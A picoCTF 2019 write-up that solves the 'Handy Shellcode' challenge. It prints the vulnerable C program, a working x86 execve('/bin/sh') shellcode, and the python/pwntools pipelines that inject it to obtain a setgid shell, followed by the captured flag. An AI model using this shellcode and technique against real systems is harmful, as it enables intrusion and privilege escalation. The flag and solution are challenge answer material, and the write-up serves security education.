# PicoCTF19 Handy Shellcode

## Challenge

This [program](https://2019shell1.picoctf.com/static/55d1e7f761111a3cf6eec259e5dc44f8/vuln) executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode on the shell server. [Source](https://2019shell1.picoctf.com/static/55d1e7f761111a3cf6eec259e5dc44f8/vuln.c).

## Hints

You might be able to find some good shellcode online.

## Solution

Let's view that directory:

```bash
samson@pico-2019-shell1:/problems/handy-shellcode$ ls -al
total 732
drwxr-xr-x   2 root       root                4096 Sep 28 21:53 .
drwxr-x--x 684 root       root               69632 Oct 10 18:02 ..
-r--r-----   1 hacksports handy-shellcode_5     39 Sep 28 21:53 flag.txt
-rwxr-sr-x   1 hacksports handy-shellcode_5 661832 Sep 28 21:53 vuln
-rw-rw-r--   1 hacksports hacksports           624 Sep 28 21:53 vuln.c
```
As my user is currently `samson` and I am not in that handy-shellcode_5 group, I cannot `cat` the file `flag.txt`. Let's take a look at the source code.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];
  puts("Enter your shellcode:");
  vuln(buf);
  puts("Thanks! Executing now...");
  ((void (*)())buf)();
  puts("Finishing Executing Shellcode. Exiting now...");
  return 0;
}
```

It seems like it's almost prompting us to enter shellcode and execute it. More precisely, it takes in our input and echos it out with the `gets()` and `puts()` function calls.

Then we have this line here:
```
  ((void (*)())buf)();
```
This takes `buf`, casts it to the void function pointer which returns nothing and then runs that function. So it'll execute whatever is at the address for `buf`.

Let's test our assumptions....

```bash
samson@pico-2019-shell1:/problems/handy-shellcode$ ./vuln
Enter your shellcode:
A    
A
Thanks! Executing now...
Segmentation fault (core dumped)
```

So what is shellcode? Basically it's raw assembly code to be executed.

So let's go to a handy website full of these shellcodes: [http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)

But before we decide which shellcode to use, we need to know our end goal. We want to drop into a shell that will let us `cat` or `print` the file `flag.txt`.

Let's start with dropping into a shell, is there a shellcode for `/bin/sh`.... Yes.

---

Let's use this one: [http://shell-storm.org/shellcode/files/shellcode-811.php](http://shell-storm.org/shellcode/files/shellcode-811.php)

```
/*
Title:	Linux x86 execve("/bin/sh") - 28 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80



*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";

int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}

```

But let's get that shellcode onto one line:

`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`

Let's try it?

```bash
samson@pico-2019-shell1:/problems/handy-shellcode$ ./vuln 
Enter your shellcode:
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
Thanks! Executing now...
Segmentation fault (core dumped)
```

Wait that's not how we enter shellcode. We need the shell to interpret the `\x` as bytes not strings.

```bash
samson@pico-2019-shell1:/problems/handy-shellcode$ python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'" | ./vuln
Enter your shellcode:
1�Ph//shh/bin����°
                 ̀1�@̀
Thanks! Executing now...
```

Awesome it worked but it won't hold a shell for us, so let's use `cat`. To recap, if you `cat file.txt`, it'll just print out the contents of the file. However, if you just type `cat`, it will echo back whatever input you give it until you quit the program. Let's try it out.

```bash
samson@pico-2019-shell1:/problems/handy-shellcode$ (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"; cat) | ./vuln
Enter your shellcode:
1�Ph//shh/bin����°
                 ̀1�@̀
Thanks! Executing now...
id
uid=30646(samson) gid=8874(handy-shellcode_5) groups=8874(handy-shellcode_5),1002(competitors),30647(samson)
ls -al      
total 732
drwxr-xr-x   2 root       root                4096 Sep 28 21:53 .
drwxr-x--x 684 root       root               69632 Oct 10 18:02 ..
-r--r-----   1 hacksports handy-shellcode_5     39 Sep 28 21:53 flag.txt
-rwxr-sr-x   1 hacksports handy-shellcode_5 661832 Sep 28 21:53 vuln
-rw-rw-r--   1 hacksports hacksports           624 Sep 28 21:53 vuln.c
cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}
```

## Flag

`picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}`

## Alternative solution

The PicoCTF Shell comes with Python and Pwntools preinstalled so we could have leveraged this as well.

```bash
samson@pico-2019-shell1:/problems/handy-shellcode$ (python -c "import pwn; print(pwn.asm(pwn.shellcraft.linux.sh()))"; cat) | ./vuln
Enter your shellcode:
jhh///sh/bin��h�4$ri1�QjY�Q��1�j
                                X̀
Thanks! Executing now...
cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}
```